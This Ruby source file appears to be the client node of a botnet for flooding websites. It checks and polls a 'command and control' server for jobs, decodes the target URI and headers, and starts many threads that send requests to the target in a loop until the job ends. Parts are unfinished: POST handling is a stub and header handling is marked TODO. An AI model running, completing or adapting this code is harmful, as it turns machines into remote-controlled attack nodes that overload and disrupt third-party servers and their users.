class Client
	def initialize(server, thread_count)
		@server = server
		@has_job = false
		@node_id = 1
		@thread_count = thread_count

		@job_id = 0
		@http_method = ""
		@http_uri = ""
		@http_host = ""
		@http_headers = ""
		@http_data = ""
	end

	def invoke
		# Make sure we can reach C&C
		cc_stability_test

		while @has_job == false
			# Poll
			job = request_job
			
			@has_job = true if job
		end

		@job_id 		= job["id"]
		#@node_id 		= job["node_id"]
		@http_method 	= job["http_method"]
		@http_uri 		= job["http_uri"]
		@http_host 		= job["http_host"]
		@http_headers 	= Base64.decode64(job["http_headers"])
		@http_data 		= Base64.decode64(job["http_data"])

		# should probably start computing...
		kick_off_job!
	end

	def request_job
		endpoint = @server + "/poll"

		response = Mechanize.new.get(endpoint)
		# Parse response
		response_parsed = JSON.parse(response.body)
		
		if response_parsed["status"] == "active"
			return response_parsed
		else
			return false
		end
	end

	def kick_off_job!
		puts "Kicking off job with #{@thread_count} threads"
		monitor_thread_id = @thread_count + 1

		job_threads = (1..monitor_thread_id).map do |i|
			Thread.new(i) do |i|
				if i == monitor_thread_id
					monitor_job_status
				else
					while @has_job
						send_request
					end
				end
			end
		end

		job_threads.each {|t| t.join }
	end

	def send_request
		req = Mechanize.new
		puts "initiating request to: #{@http_uri} on thread "

		if @http_method.downcase == "get"
			begin
				response = req.get(@http_uri)
				# TODO
				# Need to make this actually handle headers, etc.
			rescue
				puts "Unable to connect."
			end
		else
			# POST
		end
	end

	def monitor_job_status
		# This will want to be timed, rather than a constant loop
		while @has_job
			puts "Checking job status for job #{@job_id} on node #{@node_id}"
			endpoint = "#{@server}/poll/#{@node_id}/#{@job_id}"

			begin
				response = Mechanize.new.get(endpoint)
				# Parse response
				response_parsed = JSON.parse(response.body)
				
				puts response_parsed
				if response_parsed["status"] == "active"
					return response_parsed
				else
					@has_job = false
					return false
				end
			rescue
				# Ehh, let it slide for now.
				# Eventually there should be an error counter that kills
				# jobs based on a certain number of unsuccessful attempts
			end
		end
	end

	def cc_stability_test
		# Check status to C&C
		cc_agent = Mechanize.new
		response = cc_agent.head(@server)

		if response.code.to_i != 200
			puts "(!) Unable to communicate with command and control server"
			puts "(!) Please confirm address: #{@server}"
			exit
		end
	end

	def random_polling_interval
		13 + rand(64)
	end
end